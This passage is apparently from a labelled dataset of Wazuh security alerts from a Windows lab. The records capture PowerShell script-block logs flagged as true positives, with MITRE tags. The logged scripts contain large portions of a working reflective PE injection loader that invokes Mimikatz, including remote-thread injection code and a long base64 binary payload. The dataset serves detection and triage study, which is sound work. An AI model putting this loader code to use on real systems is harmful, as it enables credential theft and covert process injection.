)\n\n\t    $Domain = [AppDomain]::CurrentDomain\n\t    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')\n\t    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n\t    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)\n\t    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpec\r\n\r\nScriptBlock ID: b5207ccb-4732-4af2-8224-9d1dde7e3243\r\nPath: \"", "version": "1", "systemTime": "2025-07-06T14:02:37.1580049Z", "eventRecordID": "34766", "threadID": "5652", "computer": "Win11Client.soclab.internal", "task": "2", "processID": "1972", "severityValue": "WARNING", "providerName": "Microsoft-Windows-PowerShell"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Powershell script may be executing suspicious code with CreateThread API", "groups": ["windows", " powershell"], "mitre": {"technique": ["Native API"], "id": ["T1106"], "tactic": ["Execution"]}, "id": "91810"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751810587.42279206", "timestamp": "2025-07-06T14:03:07.640+0000"}, "fields": {"timestamp": ["2025-07-06T14:03:07.640Z"]}, "sort": [1751810587640]}}
{"id": "dQoM4JcBiGYaRV9XRrXE", "description": "Powershell script may be using Base64 decoding method", "label": "TP", "rule_level": 10, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "dQoM4JcBiGYaRV9XRrXE", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"messageNumber": "1", "messageTotal": "1", "scriptBlockText": "Function Main  {   $Win32Functions = Get-Win32Functions   $Win32Types = Get-Win32Types   $Win32Constants =  Get-Win32Constants      $RemoteProcHandle = [IntPtr]::Zero     #If a remote process to inject in to is specified, get a handle to it   if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne \\\"\\\"))   {    Throw \\\"Can't supply a ProcId and ProcName, choose one or the other\\\"   }   elseif ($ProcName -ne $null -and $ProcName -ne \\\"\\\")   {    $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)    if ($Processes.Count -eq 0)    {     Throw \\\"Can't find process $ProcName\\\"    }    elseif ($Processes.Count -gt 1)    {     $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId     Write-Output $ProcInfo     Throw \\\"More than one instance of $ProcName found, please specify the process ID to inject in to.\\\"    }    else    {     $ProcId = $Processes[0].ID    }   }      #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.   #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege #\\t\\tif ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId) #\\t\\t{ #\\t\\t\\tWrite-Verbose \\\"Getting SeDebugPrivilege\\\" #\\t\\t\\tEnable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants #\\t\\t}\\t      if (($ProcId -ne $null) -and ($ProcId -ne 0))   {    $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)    if ($RemoteProcHandle -eq [IntPtr]::Zero)    {     Throw \\\"Couldn't obtain the handle for process ID: $ProcId\\\"    }        Write-Verbose \\\"Got the handle for the remote process to inject in to\\\"   }       #Load the PE reflectively   Write-Verbose \\\"Calling Invoke-MemoryLoadLibrary\\\"          try         {             $Processors = Get-WmiObject -Class Win32_Processor         }         catch         {             throw ($_.Exception)         }          if ($Processors -is [array])         {             $Processor = $Processors[0]         } else {             $Processor = $Processors         }          if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )         {             Write-Verbose ( \\\"Architecture: \\\" + $Processor.AddressWidth + \\\" Process: \\\" + ([System.IntPtr]::Size * 8))             Write-Error \\\"PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS.\\\" -ErrorAction Stop         }          #Determine whether or not to use 32bit or 64bit bytes         if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)         {             [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)         }         else         {             [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)         }         $PEBytes[0] = 0         $PEBytes[1] = 0   $PEHandle = [IntPtr]::Zero   if ($RemoteProcHandle -eq [IntPtr]::Zero)   {    $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs   }   else   {    $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle   }   if ($PELoadedInfo -eq [IntPtr]::Zero)   {    Throw \\\"Unable to load PE, handle returned is NULL\\\"   }      $PEHandle = $PELoadedInfo[0]   $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process         #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.   $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants   if (($PEInfo.FileType -ieq \\\"DLL\\\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))   {    #########################################    ### YOUR CODE GOES HERE    #########################################                     Write-Verbose \\\"Calling function with WString return type\\\"         [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \\\"powershell_reflective_mimikatz\\\"         if ($WStringFuncAddr -eq [IntPtr]::Zero)         {          Throw \\\"Couldn't find function address.\\\"         }         $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])         $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)                     $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)         [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)                     [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)         if ($OutputPtr -eq [IntPtr]::Zero)         {         \\tThrow \\\"Unable to get output, Output Ptr is NULL\\\"         }         else         {             $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)             Write-Output $Output             $Win32Functions.LocalFree.Invoke($OutputPtr);         }    #########################################    ### END OF YOUR CODE    #########################################   }   #For remote DLL injection, call a void function which takes no parameters   elseif (($PEInfo.FileType -ieq \\\"DLL\\\") -and ($RemoteProcHandle -ne [IntPtr]::Zero))   {    $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \\\"VoidFunc\\\"    if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))    {     Throw \\\"VoidFunc couldn't be found in the DLL\\\"    }        $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle    $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle        #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions   }      #Don't free a library if it is injected in a remote process   if ($RemoteProcHandle -eq [IntPtr]::Zero)   {    Invoke-MemoryFreeLibrary -PEHandle $PEHandle   }   else   {    #Just delete the memory allocated in PowerShell to build the PE before injecting to remote process    $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)    if ($Success -eq $false)    {     Write-Warning \\\"Unable to call VirtualFree on the PE's memory. Continuing anyways.\\\" -WarningAction Continue    }   }      Write-Verbose \\\"Done!\\\"  }", "scriptBlockId": "bfe9b4f9-1068-45f2-a211-bab6a711f804"}, "system": {"eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nFunction Main\n\t{\n\t\t$Win32Functions = Get-Win32Functions\n\t\t$Win32Types = Get-Win32Types\n\t\t$Win32Constants =  Get-Win32Constants\n\t\t\n\t\t$RemoteProcHandle = [IntPtr]::Zero\n\t\n\t\t#If a remote process to inject in to is specified, get a handle to it\n\t\tif (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne \"\"))\n\t\t{\n\t\t\tThrow \"Can't supply a ProcId and ProcName, choose one or the other\"\n\t\t}\n\t\telseif ($ProcName -ne $null -and $ProcName -ne \"\")\n\t\t{\n\t\t\t$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)\n\t\t\tif ($Processes.Count -eq 0)\n\t\t\t{\n\t\t\t\tThrow \"Can't find process $ProcName\"\n\t\t\t}\n\t\t\telseif ($Processes.Count -gt 1)\n\t\t\t{\n\t\t\t\t$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId\n\t\t\t\tWrite-Output $ProcInfo\n\t\t\t\tThrow \"More than one instance of $ProcName found, please specify the process ID to inject in to.\"\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t$ProcId = $Processes[0].ID\n\t\t\t}\n\t\t}\n\t\t\n\t\t#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.\n\t\t#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege\n#\t\tif ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)\n#\t\t{\n#\t\t\tWrite-Verbose \"Getting SeDebugPrivilege\"\n#\t\t\tEnable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants\n#\t\t}\t\n\t\t\n\t\tif (($ProcId -ne $null) -and ($ProcId -ne 0))\n\t\t{\n\t\t\t$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)\n\t\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t\t{\n\t\t\t\tThrow \"Couldn't obtain the handle for process ID: $ProcId\"\n\t\t\t}\n\t\t\t\n\t\t\tWrite-Verbose \"Got the handle for the remote process to inject in to\"\n\t\t}\n\t\t\n\n\t\t#Load the PE reflectively\n\t\tWrite-Verbose \"Calling Invoke-MemoryLoadLibrary\"\n\n        try\n        {\n            $Processors = Get-WmiObject -Class Win32_Processor\n        }\n        catch\n        {\n            throw ($_.Exception)\n        }\n\n        if ($Processors -is [array])\n        {\n            $Processor = $Processors[0]\n        } else {\n            $Processor = $Processors\n        }\n\n        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )\n        {\n            Write-Verbose ( \"Architecture: \" + $Processor.AddressWidth + \" Process: \" + ([System.IntPtr]::Size * 8))\n            Write-Error \"PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS.\" -ErrorAction Stop\n        }\n\n        #Determine whether or not to use 32bit or 64bit bytes\n        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)\n        {\n            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)\n        }\n        else\n        {\n            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)\n        }\n        $PEBytes[0] = 0\n        $PEBytes[1] = 0\n\t\t$PEHandle = [IntPtr]::Zero\n\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t{\n\t\t\t$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs\n\t\t}\n\t\telse\n\t\t{\n\t\t\t$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle\n\t\t}\n\t\tif ($PELoadedInfo -eq [IntPtr]::Zero)\n\t\t{\n\t\t\tThrow \"Unable to load PE, handle returned is NULL\"\n\t\t}\n\t\t\n\t\t$PEHandle = $PELoadedInfo[0]\n\t\t$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process\n\t\t\n\t\t\n\t\t#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.\n\t\t$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\tif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\n\t\t{\n\t\t\t#########################################\n\t\t\t### YOUR CODE GOES HERE\n\t\t\t#########################################\n                    Write-Verbose \"Calling function with WString return type\"\n\t\t\t\t    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"powershell_reflective_mimikatz\"\n\t\t\t\t    if ($WStringFuncAddr -eq [IntPtr]::Zero)\n\t\t\t\t    {\n\t\t\t\t\t    Throw \"Couldn't find function address.\"\n\t\t\t\t    }\n\t\t\t\t    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])\n\t\t\t\t    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)\n                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)\n\t\t\t\t    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)\n                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)\n\t\t\t\t    if ($OutputPtr -eq [IntPtr]::Zero)\n\t\t\t\t    {\n\t\t\t\t    \tThrow \"Unable to get output, Output Ptr is NULL\"\n\t\t\t\t    }\n\t\t\t\t    else\n\t\t\t\t    {\n\t\t\t\t        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)\n\t\t\t\t        Write-Output $Output\n\t\t\t\t        $Win32Functions.LocalFree.Invoke($OutputPtr);\n\t\t\t\t    }\n\t\t\t#########################################\n\t\t\t### END OF YOUR CODE\n\t\t\t#########################################\n\t\t}\n\t\t#For remote DLL injection, call a void function which takes no parameters\n\t\telseif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -ne [IntPtr]::Zero))\n\t\t{\n\t\t\t$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"VoidFunc\"\n\t\t\tif (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))\n\t\t\t{\n\t\t\t\tThrow \"VoidFunc couldn't be found in the DLL\"\n\t\t\t}\n\t\t\t\n\t\t\t$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle\n\t\t\t$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle\n\t\t\t\n\t\t\t#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors\n\t\t\t$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions\n\t\t}\n\t\t\n\t\t#Don't free a library if it is injected in a remote process\n\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t{\n\t\t\tInvoke-MemoryFreeLibrary -PEHandle $PEHandle\n\t\t}\n\t\telse\n\t\t{\n\t\t\t#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process\n\t\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\n\t\t\tif ($Success -eq $false)\n\t\t\t{\n\t\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" -WarningAction Continue\n\t\t\t}\n\t\t}\n\t\t\n\t\tWrite-Verbose \"Done!\"\n\t}\r\n\r\nScriptBlock ID: bfe9b4f9-1068-45f2-a211-bab6a711f804\r\nPath: \"", "version": "1", "systemTime": "2025-07-06T14:02:37.1979602Z", "eventRecordID": "34775", "threadID": "5652", "computer": "Win11Client.soclab.internal", "task": "2", "processID": "1972", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Powershell script may be using Base64 decoding method", "groups": ["windows", " powershell"], "mitre": {"technique": ["Deobfuscate/Decode Files or Information"], "id": ["T1140"], "tactic": ["Defense Evasion"]}, "id": "91809"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751810587.42421796", "timestamp": "2025-07-06T14:03:07.690+0000"}, "fields": {"timestamp": ["2025-07-06T14:03:07.690Z"]}, "sort": [1751810587690]}}
{"id": "wgoM4JcBiGYaRV9XRbSU", "description": "Powershell script used \"Invoke-command\" cmdlet to execute code on remote computer", "label": "TP", "rule_level": 14, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "wgoM4JcBiGYaRV9XRbSU", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"messageNumber": "173", "messageTotal": "173", "scriptBlockText": "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ik6LToxOjU6OTo9OkE6RTpJOlM60TrSPA49GD1/PYo96T33PUE+YT5rPtc+Aj8NP3g/rj/CP+k/AAAAAAkAVAAAAAAwCDAiME8wWDC8McQx2DHgMbYyuzLNMnkzizOVMwY0FzQeNDM0TDRYNF80dDR7NII0jDTINFM1YzVwNeM16jXxNfg1BjYMNhw2KzYAEAkABAEAAJw4rDiwOLQ4uDjEOMg4zDisObg5FDoYOhw6IDooOjA6ODpAOkg6UDpYOmA6aDpwOng6gDqIOpA6mDqgOqg6sDq4OsA6yDrQOtg64DroOvA6+DoAOwg7EDsYOyA7KDswOzg7QDtIO1A7WDtgO2g7cDt4O4A7iDuQO5g7oDuoO7A7uDvAO8g70DvYO+A76DvwO/g7ADwIPBA8GDwgPCg8MDw4PEA8SDxQPFg8YDxoPHA8eDyAPIg8kDyYPKA8qDywPLg8wDzIPNA82DzgPOg88Dz4PAA9CD0QPRg9ID0oPTA9OD1APUg9UD1YPWA9aD1wPXg9gD2IPZA9mD0AAAAgCQAQAAAAsDO0M7gzAAAAMAkAEAEAAJgyoDKoMqwysDK0MrgyvDLAMsQyzDLQMtQy2DLcMuAy5DLoMvQy/DIAMwQzCDMMMyA4JDgoOCw4MDg0ODg4PDhAOEQ4SDhMOFA4VDhYOFw4YDhkOGg4bDhwOHQ4eDh8OIA4hDiIOIw4kDiUOJg4nDigOKQ4qDisOLA4tDi4OLw4wDjEOMg41DjYONw44DjkOOg47DjwOPQ4+Dj8OAA5BDkIOQw5EDkUORg5HDkgOSQ5KDksOTA5NDk4OTw5QDlEOUg5TDlQOVQ5WDlcOWA5ZDloOWw5cDl0OXg5fDmAOYg5jDmQOZQ5mDmcOaA5pDmoOaw5sDm0Obg5vDnAOcQ5yDnMOdA51DkAAABACQDIAQAAsDi0OLg4vDgkOSw5NDk8OUQ5TDlUOVw5ZDlsOXQ5fDmEOYw5lDmcOaQ5rDm0Obw5xDnMOdQ53DnkOew59Dn8OQQ6DDoUOhw6JDosOjQ6PDpEOkw6VDpcOmQ6bDp0Onw6hDqMOpQ6nDqkOqw6tDq8OsQ6zDrUOtw65DrsOvQ6/DoEOww7FDscOyQ7LDs0Ozw7RDtMO1Q7XDtkO2w7dDt8O4Q7jDuUO5w7pDusO7Q7vDvEO8w71DvcO+Q77Dv0O/w7BDwMPBQ8HDwkPCw8NDw8PEQ8TDxUPFw8ZDxsPHQ8fDyEPIw8lDycPKQ8rDy0PLw8xDzMPNQ83DzkPOw89Dz8PAQ9DD0UPRw9JD0sPTQ9PD1EPUw9VD1cPWQ9bD10PXw9hD2MPZQ9nD2kPaw9tD28PcQ9zD3UPdw95D3sPfQ9/D0EPgw+FD4cPiQ+LD40Pjw+RD5MPlQ+XD5kPmw+dD58PoQ+jD6UPpw+pD6sPrQ+vD7EPsw+1D7cPuQ+7D70Pvw+BD8MPxQ/HD8kPyw/ND88P0Q/TD9UP1w/ZD9sP3Q/fD+EP4w/lD+cP6Q/rD+0P7w/xD/MP9Q/3D/kP+w/9D/8PwBQCQCIAQAABDAMMBQwHDAkMCwwNDA8MEA6SDpQOlg6YDpoOnA6eDqAOog6kDqYOqA6qDqwOrg6wDrIOtA62DrgOug68Dr4OgA7CDsQOxg7IDsoOzA7ODtAO0g7UDtYO2A7aDtwO3g7gDuIO5A7mDugO6g7sDu4O8A7yDvQO9g74DvoO/A7+DsAPAg8EDwYPCA8KDwwPDg8QDxIPFA8WDxgPGg8cDx4PIA8iDyQPJg8oDyoPLA8uDzAPMg80DzYPOA86DzwPPg8AD0IPRA9GD0gPSg9MD04PUA9SD1QPVg9YD1oPXA9eD2APYg9kD2YPaA9qD2wPbg9wD3IPdA92D3gPeg98D34PQA+CD4QPhg+ID4oPjA+OD5APkg+UD5YPmA+aD5wPng+gD6IPpA+mD6gPqg+sD64PsA+yD7QPtg+4D7oPvA++D4APwg/ED8YPyA/KD8wPzg/QD9IP1A/WD9gP2g/cD94P4A/iD+QP5g/oD+oP7A/uD/AP8g/0D/YP+A/6D/wP/g/AGAJAGgAAAAAMAgwEDAYMCAwKDAwMDgwQDBIMFAwWDBgMGgwcDB4MIAwiDCQMJgwoDCoMLAwuDDAMMgw0DDYMOAw6DDwMPgwADEIMRAxGDEgMSgxMDE4MUAxSDFQMVgxWjteO2I7ZjsAcAkAGAEAAPQ0/DQENQw1FDUcNSQ1LDU0NTw1RDVMNVQ1XDVkNWw1dDV8NYQ1jDWUNZw1pDWsNbQ1vDXENcw11DVQPFg8eDyEPJA8nDyoPLQ8uDy8PMA8xDzIPMw80DzUPNg83DzgPOQ86DzsPPA89Dz4PPw8AD0EPQg9DD0QPRg9ID0oPTA9OD1APUg9UD1YPWA9aD1wPXg9gD2IPZA9mD2gPag9sD24PcA9yD3QPdg94D3oPfA9+D0APgg+ED4YPiA+KD4wPjg+QD5IPlA+WD5gPmg+cD54PoA+hD6IPow+kD6UPpg+nD6gPqg+sD64PsA+yD7QPtg+YD9kP2g/bD9wP3Q/eD98P4A/hD+IP4w/lD+cPwAAAIAJAOgBAABQMVgxYDFoMXAxeDGAMYgxkDGYMaAxqDGwMbgxwDHIMdAx2DHgMeQx6DHsMfAx9DH4MfwxADIEMggyDDIQMhQyGDIcMiAyJDIoMiwyMDI0MjgyPDJAMkgyUDJYMmAyaDJwMngygDKIMpAymDKgMqgysDK4MsAyyD